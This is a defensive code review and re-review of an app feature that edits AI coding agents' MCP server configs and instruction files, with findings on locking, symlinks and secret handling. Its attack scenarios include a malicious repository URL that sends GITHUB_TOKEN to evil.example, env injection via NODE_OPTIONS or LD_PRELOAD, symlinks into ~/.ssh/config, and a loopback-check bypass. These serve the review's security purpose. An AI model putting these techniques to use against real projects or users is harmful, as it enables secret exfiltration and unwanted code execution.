# Code review: Agent setup (MCP, instructions, skills)

Worktree `D:\kelpie-par`, branch `phase14/agent-setup` (base efff847), uncommitted. Reviewed 2026-10-25 on Windows. I only reviewed the code and changed no source files.

## Scope
- Rust: `app/src-tauri/src/agent_config.rs` and `agent_config/{formats,mcp,guides,backup,registry,tests}.rs`, plus the `accounts.rs` writer migration, `lib.rs`, `Cargo.toml` and `Cargo.lock`.
- TS: `components/agent-setup.tsx` and `lib/agent-setup.ts` (+ test), `lib/plugins.ts`, `types.ts`, `settings-catalog.ts`, `commands.ts`, `welcome.tsx`, `settings-page.tsx`, locales.
- Also: docs, `scripts/e2e/agent_setup.py`.
- About 4.4k new LOC.
- Checks I ran myself:
  - `cargo test -p kelpie --lib agent_config`: 35/35 pass.
  - `vitest agent-setup.test.ts`: 16/16.
  - `pnpm i18n:check`: 0 missing.
  - `pnpm typecheck`: clean.
- Probes, all against fixtures and scratch only:
  - A scratch crate `#[path]`-including `formats.rs` (same lockfile versions), for round-trip behaviour.
  - A read-only mmap grep of the installed `claude.exe` (2.1.31x) and `codex.exe` (0.163) to check vendor facts.
  - The scratch folder has been deleted. Probe build outputs were removed from `D:\kelpie-p9-target`.

## Overall assessment
The basic pipeline is sound and the parts you asked about largely hold up:
- Preview → backup → write → verify → rollback all go through one path.
- The stale-preview token covers both the old and the new content.
- The project → user confirmation is enforced in `apply`, not only in the UI.
- The JSON CST writer keeps comments, order, indentation, CRLF, BOM, escapes and big integers. I checked this in the probe.
- Env values never reach the UI, project files or logs.
- The e2e-only overrides are gated correctly.

The defects are at the edges your focus list names:
1. A real lost-update / clobber path on `~/.claude.json`. Claude Code takes a lock and re-reads the file when it saves; Kelpie does neither, and its rollback can overwrite a concurrent Claude write.
2. Project-scope and instruction writes follow symlinks out of the repository.
3. A common `CLAUDE.md -> AGENTS.md` setup gets corrupted.
4. The "exact command" confirmation does not cover env, which is part of what runs.
5. Codex env handling rests on a wrong vendor assumption: Codex does have `env_vars`, `env_http_headers` and `bearer_token_env_var`.

No finding allows code execution: Kelpie never starts a server or a registry package. Nothing in the e2e/test isolation is a blocker.

## Critical
None.

## High

### H1. `~/.claude.json`: no shared lock, and the rollback overwrites a concurrent agent write
**Where:**
- `agent_config.rs:772-810` (`apply`)
- `agent_config.rs:751-770` (`verify`, the mismatch at `:766`)
- `agent_config.rs:800-805` (rollback via `put_back(&d.old)`)

**Fact (verified in the installed `claude.exe`):** Claude saves its global config through proper-lockfile (default lock path `${file}.lock`, i.e. `~/.claude.json.lock`). It re-reads the file under that lock and applies an updater; the string is "Failed to save config with lock", in `saveGlobalConfig`.

**Failure scenarios.** Kelpie runs many Claude sessions, so Claude writes this file often.
- **(a) Kelpie's change is silently lost.** Kelpie's rename can land after Claude's locked read and before Claude's write. Claude then writes its old base back. If `verify` ran in between, the UI says "Saved" while the server is gone.
- **(b) Both edits are wiped.** Claude writes just after Kelpie's rename. The file now holds Claude's re-serialised merge, which includes Kelpie's server but differs in text. `verify` sees `on_disk != c.new` and calls `put_back(old)`. That writes the pre-edit snapshot over Claude's fresh write, wiping Claude's change (trust flags, MCP approvals, account fields) and Kelpie's own. The message then says "Nothing was changed: the files are back as they were."
- **(c) Unguarded window.** Between the token check (`:777`), `backup::save` (which also prunes and parses every backup record) and the rename, nothing guards against an agent write.

**Fix:**
- For `.claude.json`, take Claude's lock for the whole read → hash check → write → verify sequence. That means `mkdir ~/.claude.json.lock`, treating locks older than about 10 s as stale (proper-lockfile semantics), and `rmdir` afterwards.
- For every file, compare the on-disk content with `c.old` right before the rename. Abort if it differs.
- In the rollback, call `put_back` only when the disk still holds exactly what Kelpie wrote (or that text fails to parse). If a third party changed the file, leave it, and report "changed by another program; your backup is X".
- Add a test that simulates a write between rename and verify.

### H2. Project-scope and instruction writes follow symlinks out of the repository
**Where:**
- `agent_config.rs:722`: `write_atomic` canonicalises and writes through links.
- `agent_config.rs:186-201` (`mcp_path`) and `:212-214` (`claude_disabled_file`).
- `guides.rs:105-180` (`unify`).

**Scenario (macOS/Linux, or Windows with `core.symlinks`).** A repo ships `CLAUDE.md -> ../../.bashrc` (or `~/.ssh/config`, `~/.gitconfig`) and no `AGENTS.md`. The user clicks "One file for all agents":
- `unify` takes the `(None, true)` branch at `guides.rs:118-121`. It copies the target's private content into `<repo>/AGENTS.md`, from where it can be committed and pushed.
- It writes `@AGENTS.md\n` through the link, replacing the user's file.
- The preview header only shows `<repo>/CLAUDE.md`, so nothing looks out of place.

The same applies to MCP files:
- A repo's `.mcp.json`, `.cursor/` or `.gemini/` can link to `~/.claude.json`, `~/.cursor/mcp.json` or `~/.gemini/settings.json`.
- An Add, Toggle or Copy to a "project" target then edits the user file under the untrusted label.
- It goes the other way too: a user file that links into a repo receives `include_env` secrets.
- A missing file under a symlinked directory falls back to the raw path; `create_dir_all` follows the link.

**Fix:**
- For project-scope targets (`mcp_path` project arms, `claude_disabled_file`, every path in `unify`), resolve the path and require it to stay inside the canonical project root. Otherwise refuse, or at minimum show the resolved target in the diff header and treat it as a different scope.
- Check `symlink_metadata` on each component under the root.
- Show `canonicalize(path)` in `FileDiff.path` whenever it differs from the logical path.

### H3. The common `CLAUDE.md -> AGENTS.md` setup gets a self-import appended
**Where:** `guides.rs:128-137`.

**Scenario.** `CLAUDE.md` is a symlink to `AGENTS.md`, a widely recommended setup:
- `claude == agents`, the content is meaningful, and `has_import` is false.
- So `new_claude = text + "\n@AGENTS.md\n"` is written through the link into `AGENTS.md`.
- `AGENTS.md` now imports itself. Codex, Cursor and others read a literal `@AGENTS.md` line.
- The warning "CLAUDE.md has text of its own" is wrong.

The `(None, true)` branch has a smaller version of the same problem: a `CLAUDE.md` with text and a stray `@AGENTS.md` line moves that line into `AGENTS.md`.

**Fix:**
- If `CLAUDE.md` and `AGENTS.md` resolve to the same file, or hold identical content, report "already one file" and change nothing.
- Strip `@AGENTS.md` lines from text that moves into `AGENTS.md`.
- Add a test for both cases (symlink and hardlink/identical content).

### H4. The untrusted-copy confirmation does not show everything that will run
**Where:**
- `agent_config.rs:509-512`: `Untrusted.command` is only `command_line()`, redacted.
- `mcp.rs:292-327`.
- `agent-setup.tsx:81-89`.

**Scenarios:**
- **With "Also write the environment values" ticked**, a project server's env values are copied into the user's file without ever being shown. Those values can change what executes: `NODE_OPTIONS=--require ./x.js`, `PYTHONPATH=.`, `PATH`, `LD_PRELOAD`/`DYLD_*`. The panel says "It would run: <command>", which is not the whole launch spec.
- **Without it**, each literal value becomes a reference to the user's own variable of the same name. A repo declaring `env: {AWS_SECRET_ACCESS_KEY: "x", GITHUB_TOKEN: "x"}` gets the user's real secrets passed explicitly to an untrusted program. That widens exposure on agents that do not hand their whole environment to MCP children: Codex whitelists. The conversion is only mentioned as a generic warning line above the confirmation.
- **Relative commands** (`./scripts/mcp.sh`, `node tools/mcp.js`) copied to user scope run in every project the user opens. Any repo with a file at that path then executes in the user's agent sessions. `cwd` is dropped silently, which is listed only as "Not carried over".
- **Args are joined without quoting**, so argument boundaries are not visible.

**Fix:**
- For project → user copies, the untrusted block should list, per destination:
  - argv quoted per element;
  - env names with how each becomes a value (literal, shown masked, versus "reads your $X");
  - `cwd` and other dropped keys.
- Refuse `include_env` for project-scope sources (or require a second confirmation that shows the values).
- Do not auto-convert untrusted literals into references to the user's variables: leave them out and say so.
- Warn on, or block, relative command paths and relative path args.

## Medium

### M1. Codex env handling is based on a wrong vendor fact
**Where:** `mcp.rs:277-286` ("Codex has no such syntax") and `mcp.rs:179-189`.

**Verified:** `codex.exe` 0.163 `RawMcpServerConfig` has `env_vars`, `env_http_headers`, `bearer_token_env_var`, `cwd`, `startup_timeout_sec`, `required`, and more.

**Impact:**
- A copy or Add into Codex drops every env var and header, so the server fails to start or authenticate. This contradicts the success criterion "usable in Claude, Codex and Gemini".
- Decoding a Codex entry ignores `env_vars` and `env_http_headers`, which only show up in `extra`.

**Fix:** For Codex, emit `env_vars = ["NAME", ...]` for referenced or forwarded variables, plus `env_http_headers = { Header = "VAR" }` / `bearer_token_env_var`. Decode them back into references.

### M2. Embedded references are not converted
**Where:** `mcp.rs:313` (`is_reference(v) || keep` copies verbatim).

**Impact:** `"Authorization": "Bearer ${GITHUB_TOKEN}"` is the most common Claude `.mcp.json` header. It is copied as-is to:
- Cursor, which needs `${env:…}`;
- OpenCode, which needs `{env:…}`;
- Codex, where it stays a literal.

The result is broken auth with no warning.

**Fix:** Rewrite each `${X}` / `${env:X}` / `{env:X}` occurrence inside a value into the destination's syntax. For Codex, map `Bearer ${X}` to `bearer_token_env_var = "X"`. Otherwise warn.

### M3. The fallback when the rename fails is a non-atomic write
**Where:** `agent_config.rs:725-736`.

**Problems:**
- When the rename fails (Defender or a backup tool briefly holding a handle without share-delete is common on Windows), the code calls `std::fs::write(&target)`, which truncates and then writes. A crash or power loss in that window leaves an empty or partial `~/.claude.json`, which Claude treats as a reset.
- There is no `sync_all` before the rename.
- The temp file has a fixed name, `.<name>.kelpie-tmp`, so two applies collide, and a crash leaves a plaintext copy behind.
- On unix the temp file is created world-readable (umask) and chmodded only after the content is written.
- On Windows, if the target is read-only, the temp file inherits the read-only flag and `remove_file(tmp)` fails, leaving the secret-bearing temp file in place.

**Fix:**
- Retry the rename a few times with backoff, then fail with "the file is in use", without the in-place fallback.
- Create the temp file with `OpenOptions` (`create_new`, mode `0o600` on unix, unique suffix) and `sync_all` it.
- Clear the read-only flag before removing a leftover temp file.
- Serialise `apply` with a process-wide mutex.

### M4. Diff masking is keyed on text and key names
**Where:** `agent_config.rs:614-659`.

**Gaps:**
- Secrets are found only under `env|environment|headers|http_headers`, then replaced by matching the quoted text.
- Values stored with escapes (`\u00..`, `\/`, TOML multi-line or escaped strings) do not match and appear in the context lines.
- Secret keys elsewhere (Codex `bearer_token`, `~/.claude.json` `primaryApiKey`) depend on `redact` recognising the token shape.

**Fix:** Mask by position. Walk the CST/`toml_edit` spans of string values whose key path is env/headers or matches the secret-name pattern used in `lib/agent-setup.ts`, and replace those byte ranges before splitting into lines.

### M5. Preview warnings, file errors and registry problems are never translated
**Where:**
- `agent-setup.tsx:80`: `{w}` is rendered raw.
- `:282`: `f.error`.
- `:485`: `a.problem`.

**Impact:**
- The key safety text ("This server comes from the project…", "already has a server named X: it is replaced", the env conversion notes) is English-only for vi users.
- `i18n:check` cannot see Rust strings, and `backend.json` only covers error messages that go through `errorText`.

**Fix:** Return warnings as `{code, params}` and translate them in TS, or pass each through `errorText` and add the fixed fragments to `backend.json`.

### M6. A saved registry agent appears as a terminal launcher that runs bare `npx`
**Where:** `registry.rs:105` and `plugins.ts:166` both set `launch: []`; also `welcome.tsx:54-56` and daemon `installed_presets`.

**Impact:** `npx`/`uvx` is on PATH, so the agent counts as "installed" and is offered in the project launcher as "npx CLI". Starting it in terminal mode runs `npx` with no arguments.

**Fix:** Mark ACP-only custom agents (empty `launch`, non-empty `acp`) as chat-only in launchers, or have the daemon reject terminal launch for them.

### M7. Version pinning has holes
**Where:** `registry.rs:46-54`, `:95`.

**Gaps:**
- Dist-tags other than `latest` (`@beta`, `@next`) and ranges (`@^1.2`) pass through unpinned.
- URL, `github:` and `file:` specs are accepted, e.g. `npx -y https://host/x.tgz@1.0`.
- A uvx spec like `pkg>=1` becomes `pkg>=1@ver`.

The command is shown in full, but the claim that the version is pinned does not hold.

**Fix:** Accept only npm package-name grammar (and PEP 508 names for uvx). Treat any tag that is not an exact semver/version as unpinned and replace it with `version`, or refuse.

### M8. Definition-of-done gaps (stated in the developer report)
- No `plans/reports/perf-phase-14.json` (DoD #5); the JSON went to scratch.
- The cold first read measured 21–94 ms against the 50 ms budget, and there was no release measurement.
- `ui_tour.py` light/compact screenshots were not run (DoD #6).

Likely cost on the cold read: `guides::skills` calls `describe()` (open + 4 KB read) for up to 600 files across about 25 directories, serially.

**Fix:** Measure in release. Read descriptions lazily, or in a `std::thread::scope` pool. Commit the perf JSON.

## Low
- **L1 (`formats.rs:182`, `:300-313`): CRLF lost in TOML.** `toml_edit` rewrites a CRLF `config.toml` with LF throughout (probe: 0 CR in the output). The preview hides this because `str::lines` strips `\r`. The same affects `accounts.rs` `codex_file_store`. Restore the original newline style after `to_string()`.
- **L2 (`formats.rs:156-173`): array comments lost.** `json_array_member` rewrites the whole array, dropping comments inside it (probe confirmed). Low impact, but it contradicts "comments survive".
- **L3 (duplicate keys): reader and writer disagree.** The reader takes the last `mcpServers`; the CST writer edits the first. Reject documents with duplicate keys.
- **L4 (`agent_config.rs:449-472`): toggle can be a no-op while the UI shows "off".**
  - A Claude project server disabled in the shared `.claude/settings.json` can only be switched back on in `settings.local.json`, which yields "Nothing would change" while the UI shows it off.
  - Turning one on only removes it from the disabled list; it does not add it to `enabledMcpjsonServers`.
  - Claude's per-project choices in `~/.claude.json` `projects[path]` are not read.
- **L5 (`guides.rs:296`): symlinked skills are not listed.** Skill directories that are symlinks (common for shared skills) are skipped because `DirEntry::file_type` does not follow links. Claude follows them.
- **L6 (`backup.rs:26-29`, `:81-86`): weak backup grouping and no overall cap.** The 32-bit path hash groups backups for pruning, so a collision can prune another file's copies. There is no global cap, and copies of deleted files are kept forever. They are plaintext secrets under `%LOCALAPPDATA%\Kelpie` (0600 on unix, inherited ACL on Windows), which is acceptable but worth a line in the user guide.
- **L7 (`agent_config.rs:859`): unquoted Explorer argument.** `explorer /select,<path>` passes repo-controlled skill paths unquoted. A comma in a folder name changes how Explorer parses the argument. Use `raw_arg` with a quoted path and refuse commas.
- **L8 (`registry.rs:35-42`): e2e override not limited to loopback.** Under `KELPIE_E2E`, `KELPIE_ACP_REGISTRY_URL` allows plain http to any host, not only loopback as the developer report states. Restrict it to `127.0.0.1`/`localhost`.
- **L9 (`tests.rs:714-719`): phantom test.** `only_the_end_to_end_runner_can_move_the_config_home` never sets `KELPIE_AGENT_CONFIG_HOME`, so it proves nothing about the gate. Extract a pure `Roots::from_vars(get: impl Fn(&str) -> Option<OsString>)` and test the gate with a fake environment.
- **L10 (`accounts.rs:72`): account creation now fails on an unparsable source.** Account creation now fails hard when the default `config.toml` does not parse (before, it was a line rewrite). That is a behaviour change worth a clear UI message or a fallback.
- **L11 (`agent_config.rs:289-300`): raw args and URLs cross IPC.** `McpView.args`/`url` go to the webview unmasked (masked only in TS). Env values are fine. Consider masking in Rust for consistency with the "never leaves this module" doc comment.

## Edge cases checked and found OK
- **Token:** covers old and new text, so an agent write between preview and apply is refused.
- **Confirmation:** `apply` independently re-checks `confirm_untrusted` (`agent_config.rs:780`).
- **Env in project files:** env values never reach project files, with or without the opt-in. Debug output, overview and errors carry key names only.
- **Name rules:** server names are strict for Codex TOML and are used only as JSON/TOML keys, never as paths.
- **Backup and restore ids:** backup ids are hex-validated; restore paths come from Kelpie's own data dir.
- **JSON round-trip (probe):** CRLF, tabs, one-line files, BOM, `\uXXXX` escapes, a 30-digit integer and a `1.0e10` float all survive. Comments and trailing commas in JSONC are kept, and a non-object `mcpServers` is an error, not a corruption.
- **TOML round-trip (probe):**
  - inline `mcp_servers = {…}` is refused cleanly;
  - dotted keys and arrays of tables are kept;
  - `toml_set_top_level` goes before the first table.
- **Whole-list replacement in `agent.set_custom`:** validation is all-or-nothing (`agents.rs:128-147` builds the new list first), so an invalid registry agent cannot drop plugin agents. The `acp-` prefix avoids collisions with built-ins. The save path checks `presetFor` and rolls back.
- **Registry fetch:**
  - one GET per click;
  - `https_only`, 10 s timeout, 4 MiB cap, 3 redirects (https only);
  - fixed URL outside e2e;
  - nothing executed.
- **Test isolation:**
  - `KELPIE_AGENT_CONFIG_HOME` is honoured only with `KELPIE_E2E`, and then the agents' own variables are ignored. With e2e set but no fixture home, the run is read-only.
  - Unit tests use temp-dir contexts and assert inside `write_atomic` under `cfg(test)`.
  - The e2e script sets `KELPIE_ENDPOINT`/`KELPIE_DATA_DIR` in its own `os.environ`, clears `KELPIE_ALLOW_REAL_DAEMON`, and only stats the real files.
- **Laziness:** page reads happen only on mount and Refresh, with no timers; backups load when their section is opened. The lazy chunk is wired through `lazy()`.
- **Hygiene:** no plan IDs in code, tests or e2e.

## Recommended actions (priority)
1. H1: Claude lock plus compare-before-rename, and no rollback over a third-party write.
2. H2 / H3: confine project and instruction writes to the canonical project root; handle `CLAUDE.md`≡`AGENTS.md`.
3. H4: full launch spec in the untrusted confirmation; no `include_env` and no auto-references for untrusted sources; relative-path warning.
4. M1 / M2: Codex `env_vars` / `env_http_headers` / `bearer_token_env_var`; rewrite embedded references.
5. M3: atomic write hardening (retry instead of in-place write, `create_new` 0600, fsync, unique temp name, apply mutex).
6. M4–M8: positional masking, translated warnings, ACP-only launcher, strict pinning, perf JSON plus release timing, ui_tour.

## Metrics
- Type coverage: TS strict, `tsc` clean; Rust has no `unsafe` and no `unwrap` on input paths.
- Tests: Rust 35 (agent_config) pass; TS 16 pass. The e2e reports 68/68 (developer, not re-run here: it needs a GUI build).
- Lint: i18n 0 missing. Clippy not re-run (the developer reports it clean).

## Unresolved questions
1. Does Claude Code expand `${VAR}` in user-scope `~/.claude.json` `mcpServers` the way it does in `.mcp.json`? It is assumed at `mcp.rs:280` for both scopes and not verified here.
2. Does Claude pass its full environment to stdio MCP servers? This decides how much H4's auto-reference conversion widens exposure on Claude, as opposed to Codex, which whitelists.
3. Product intent for H2: should a project file that is a symlink be refused outright, or shown with its resolved target as a different scope?

Status: DONE_WITH_CONCERNS
Summary: The core pipeline, secret handling and test isolation are solid, but four High issues need fixing before landing. Writes to `~/.claude.json` ignore Claude's own lock, and a failed check can overwrite Claude's newer data. Project and instruction writes follow symlinks out of the repo, and a `CLAUDE.md -> AGENTS.md` setup gets corrupted. The untrusted-copy confirmation leaves out env and relative-path risks. Codex env handling rests on a wrong vendor assumption.

---

## Re-review (2026-10-25, after the developer's fix round)

### What I checked
- I read the current tree: `agent_config.rs`, `mcp.rs`, `guides.rs`, `formats.rs`, `registry.rs`, `agent-setup.tsx`, and the `store.ts` / `new-session-menu.tsx` changes.
- I read the installed `claude.exe` 2.1.310 read-only (mmap). I used no network, touched no real config, and did not contact the daemon.
- Checks run:
  - `cargo test -p kelpie --lib agent_config`: 46/46.
  - `accounts`: 10/10.
  - `cargo clippy -p kelpie --all-targets -D warnings`: clean.
  - vitest `agent-setup.test.ts`: 19/19.
  - `pnpm i18n:check`: 2038 translated, 0 missing.
  - `pnpm typecheck`: clean.

**No item is still blocking.** Every High is fixed and the fixes are sound. The Mediums are fixed. Two new Medium gaps (R1, R2) are cheap and I recommend fixing them before landing. Neither is a regression to the earlier, worse state.

### 1. H1: lock and race. Fixed, with one path mismatch (R1)
**Claude's protocol, read from the binary:**
- `saveGlobalConfig` → `CM` → `ii(updater, …)` takes proper-lockfile `vl(y, {lockfilePath: \`${y}.lock\`, onCompromised})`, where `y = S_()` (the global config file).
- No `stale` or `update` option is passed, so the library defaults apply: `stale: 1e4` (10 s), `update = stale/2` (5 s mtime refresh), and a lock is stale when the lock directory's mtime is older than 10 s.
- Claude retries `ELOCKED` with backoff `[200,400,800,1600,3200,4000]` ms. If the lock is still held after that, it skips the unlocked fallback ("Config lock still held by a live process after retries; skipping the unlocked fallback write").
- Under the lock, Claude re-reads the file and applies its updater ("saveConfigWithLock: re-read hit a parse error…"). A Kelpie write that lands before Claude takes the lock is therefore merged, not lost.

**Kelpie's `ClaudeLock` (`agent_config.rs:916-949`):** `mkdir <file>.lock`, a 10 s staleness rule based on the directory mtime, a 5 s wait, and `rmdir` on drop. This is compatible.
- Kelpie holds the lock well under the 5 s refresh interval (one compare, backup, write and verify), so it never needs to refresh the mtime.
- Claude's retry budget (about 10 s) is larger than Kelpie's hold time.

**Stale-base refusal (`write_one`, `:1122-1144`):** under the lock, the disk content is compared with `c.old` before the backup and before the write. A mismatch returns `Stale`, with no backup taken and earlier files undone. Correct.

**Rollback (`undo`, `:1060-1075`):** a file is restored only if the disk still equals exactly what Kelpie wrote. Otherwise it is listed as "left as another program saved it" with its backup id. `verify` returns `Foreign` before judging parse validity, so a third party's file is never rolled back. No error path returns "Saved". Correct.

**R1 (Medium): the lock path differs from Claude's when `~/.claude.json` is a symlink.**
- Where: `agent_config.rs:920`.
- Kelpie locks `canonicalize(file) + ".lock"`. Claude passes `lockfilePath` explicitly as `${y}.lock` on the unresolved path. proper-lockfile's `realpath` option only affects its internal key, not an explicit `lockfilePath`.
- With a dotfiles symlink (`~/.claude.json -> ~/dotfiles/claude.json`), the two programs lock different directories, so there is no mutual exclusion.
- What still protects those users: the compare-before-swap check and `Foreign` detection still prevent silent loss in most interleavings.
- Fix: build the lock name from the un-canonicalised `file` (`ctx.roots.claude_json`), exactly as Claude computes `S_()`, which is `CLAUDE_CONFIG_DIR` or the home directory joined with `.claude.json`.
- On Windows without links, the two forms name the same directory entry (case-insensitive, `\\?\` prefix), so this only bites symlink users.

**Low:**
- `undo` takes the lock with `.ok()`. If Claude holds it for more than 5 s, the compare-and-restore runs without the lock, leaving a narrow race.
- Claude's `V_()` still prefers a legacy, non-empty `~/.claude/.config.json` over `.claude.json`. Kelpie only handles `.claude.json`. This is a rare legacy setup; a one-line note in the docs would do.

### 2. H2: links out of the repo. Fixed; a residual TOCTOU is accepted as Low
- `confine()` (`:193-207`) works as follows:
  1. It finds the deepest existing ancestor using `symlink_metadata`, so a dangling link counts as existing.
  2. It canonicalises that ancestor. `std::fs::canonicalize` uses `GetFinalPathNameByHandleW`, which resolves symlinks and junctions.
  3. It requires the result to be under the canonical root.
  4. A dangling link is an error.
- Coverage: it guards every project path type — `.mcp.json`, the `.gemini`/`.cursor` MCP files, `opencode.json(c)`, `.claude/settings.local.json` and `.claude/settings.json` (skipped when outside), all four `unify` paths before any read, the instruction status reads, and `resolve_in` for pinned paths.
- The overview reports a confinement error instead of reading the file.
- The diff header shows `real_path` whenever a link or junction is involved (`has_link_in_path` checks reparse attribute 0x400 on Windows).
- **TOCTOU (Low, accepted):**
  - `confine` runs in `plan_edit` inside `apply`, a few milliseconds before `write_atomic`. `write_atomic` canonicalises again and writes there, with no second confinement check.
  - Exploiting this needs a process that is already running as the user (for example an agent in the repo) to swap a directory for a junction inside that window. Such a process can already write the target directly, so nothing is escalated.
  - Cheap hardening: call `confine(root, &c.path)` again inside `write_one`, after the lock and before the write, for project-scope changes.
- **Low:** `Restore` confines only when `path.starts_with(<open project>)`. A backup of a project file that is restored while another project, or none, is open is not confined. The preview still shows `real_path`, so the user sees it. Fix: store the scope and root in `BackupInfo` and confine against the recorded root.

### 3. H3: already-unified detection. Fixed
- `guides.rs:139-145`: `same_file` (canonicalised, either direction, so links count) or identical non-empty text means `CLAUDE.md` and `AGENTS.md` are left alone, with an accurate warning. The Gemini step still runs.
- `without_import` strips stray `@AGENTS.md` lines from moved text.
- The status line counts a link as "imports".
- **Low:** text that is identical apart from whitespace still gets an import appended, so Claude reads it twice.

### 4. H4: confirmation contents and Rust enforcement. Fixed, with one gap (R2)
**What the preview contains:** `Untrusted` carries:
- the argv per element (quoted in the UI);
- the URL and cwd;
- every env and header entry as the repository wrote it, with reference markers ("reads your variable X");
- `carried` per entry;
- every resolved relative path.

**What Rust enforces:**
- `for_destination(..., untrusted=true)`: with `!carry`, every env and header entry is dropped, including references. No invented references are created.
- `apply` still requires `confirm_untrusted` (`:1086`).
- `pin_to_project` resolves the command, explicit relative args and `--opt=./x` args, and makes the cwd absolute. A `..` that would leave the project is refused. A cwd for an agent that cannot set one is refused in `encode`.

**R2 (Medium): two holes in what the copy guards.**
- **(a) Bare file names are not pinned.** `relative_path` (`:557-560`) requires a `/` or `\`, so `node server.js`, `python mcp.py` and `bash run.sh` stay relative. The `root.join(rel).exists()` fallback at `:592` never runs because `relative_path` gates it. After the copy, any project containing a `server.js` runs that file.
  - Fix: also pin a non-option, non-URL arg when `root.join(arg).is_file()`, with no slash required.
- **(b) References in args and URL are carried without the opt-in.** For an untrusted source, `${VAR}` inside args or the URL is still rewritten and written (`mcp.rs:453-461`) even when "Also write the environment values" is not ticked. A repo can use `"url": "https://evil.example/${GITHUB_TOKEN}"` or `"args": ["--key", "${AWS_SECRET_ACCESS_KEY}"]`. The argv/URL line shows the text, but it is not marked "reads your variable", and the "env not carried" note implies nothing of the user's environment reaches the server.
  - Fix: for untrusted sources, mark argv/URL references in the block (as for env) and drop or refuse them unless `include_env` is ticked.

### 5. Mediums
- **Codex env encoding: fixed.**
  - `env_vars` for variables forwarded under their own name; literal `env`.
  - `env_http_headers` for `${VAR}` headers; `bearer_token_env_var` for `Bearer ${VAR}`.
  - Decoding round-trips. Anything Codex cannot express is refused or reported (`env_unexpressible`).
  - This matches the `RawMcpServerConfig` fields in `codex.exe` 0.163.
- **Reference rewriting: fixed.**
  - `convert_refs` rewrites every `${X}` / `${env:X}` / `{env:X}` into the destination's syntax: Claude/Gemini `${X}`, Cursor `${env:X}`, OpenCode `{env:X}`.
  - `${X:-d}` is kept with a warning.
  - **Low:** a bare `$X` inside a longer value (Gemini style, `Bearer $T`) is not recognised as a reference.
- **Atomic writes: fixed.**
  - Unique temp name; `create_new`; 0600 on unix; `sync_all`.
  - Eight rename retries with backoff, then a refusal. There is no in-place fallback.
  - A read-only temp file is cleaned up. `APPLY_LOCK` serialises applies.
- **Masking by parsed position: fixed.**
  - The CST and `toml_edit` walk masks values in env/header tables and secret-named keys (`primaryApiKey` included); escape forms no longer matter.
  - **Low:** literal values starting with `$` are treated as references and left unmasked. Args rely on `redact`. An unparsable side falls back to raw text plus `redact`.
- **Registry pinning: fixed, with a Low.**
  - Only npm and PEP 508 names are accepted; URL, path and git specs are refused. Tags and ranges are replaced by the exact registry version.
  - **Low:** `exact_version` accepts `1` and `1.2`, which npm resolves as ranges (`1.x`). Require `X.Y.Z` for npx; `uvx pkg@1.2` is exact, so it is fine. uvx extras (`pkg[x]`) are silently dropped.
- **Loopback-only override: fixed, with a Low.**
  - **Low:** the prefix check accepts `http://127.0.0.1:1@evil.example/...`, where the host is `evil.example`. It is only reachable with `KELPIE_E2E`. Parse the URL and check its host.
- **Registry agents start as chat only:** `startSession` refuses them and `newChat` goes a separate way, so chat still works. Correct.
- **Translations:** warnings are now `{code, params}`, and i18n shows 0 missing.

### 6. Open question: does Claude expand `${VAR}` in user-scope `~/.claude.json`? Yes
In `claude.exe` 2.1.310, `ilt(scope, {expandVars: n = true})`:
- `case "user": … wWe({configObject: {mcpServers: ue().mcpServers}, expandVars: n, scope: "user"})`
- `local` and `project` pass the same `expandVars: n`. Only `managed` passes `expandVars: !1`.

So user-scope servers are expanded like `.mcp.json`, and Kelpie's `${VAR}` there is correct. No change needed.

### 7. New holes introduced by the fixes
- R1 and R2 above (Medium).
- **Low: project → project copies now drop even reference-only env and headers.** `untrusted && !carry` makes a copy from `.mcp.json` to `.cursor/mcp.json` lose `${TOKEN}` references that carry no secret. Allow references (converted) for project → project; drop only literals.
- **Low: the CRLF restore converts every LF.** In `with_bom` (`formats.rs:313-316`), any `\r\n` in the original makes every `\n` in the output a CRLF, including inside multi-line strings of mixed-ending files. That changes values. Only convert when the original is uniformly CRLF.

### Remaining recommended actions
1. R1: lock name from the un-canonicalised path (one line).
2. R2: pin bare in-repo file names; mark untrusted argv/URL references and require the opt-in for them.
3. Lows as convenient: confine again in `write_one` and record the scope/root for `Restore`; npm `X.Y.Z`; parse the loopback URL; references in project → project copies; uniform-CRLF check.
4. Already listed by the developer, not re-checked here: `ui_tour.py` light/compact screenshots; the file-symlink tests are unix-only and were not run on unix.

Status: DONE_WITH_CONCERNS
Summary: All four Highs and the eight Mediums are correctly fixed. The `~/.claude.json` lock matches the binary's protocol, and Claude does expand `${VAR}` in user-scope config. Nothing is still blocking, but two cheap Medium gaps should be closed before landing: R1, the lock path differs for a symlinked `~/.claude.json`; R2, untrusted copies leave bare file names relative and carry `${VAR}` references in args/URL without the opt-in.
